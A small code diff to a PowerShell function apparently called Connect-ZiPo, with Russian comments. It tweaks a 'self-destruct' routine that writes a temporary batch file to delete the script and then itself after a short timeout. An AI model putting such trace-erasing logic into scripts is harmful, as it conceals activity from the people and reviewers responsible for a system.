@@ -291,7 +291,7 @@ function Connect-ZiPo {
         # Создать bat-файл, который подождёт и удалит PowerShell-скрипт
         $batPath = "$env:TEMP\cleanup.bat"
         $bat = "@echo off`r`n" +
-               "timeout /t 3 > nul`r`n" +
+               "timeout /t 5 > nul`r`n" +
                "del `"$scriptPath`" /f /q`r`n" +
                "del `"%~f0`" /f /q"
 
@@ -306,6 +306,7 @@ function Connect-ZiPo {
         return "[ERROR] Self-destruct failed: $($_.Exception.Message)"
     }
 }
+
 
 
 
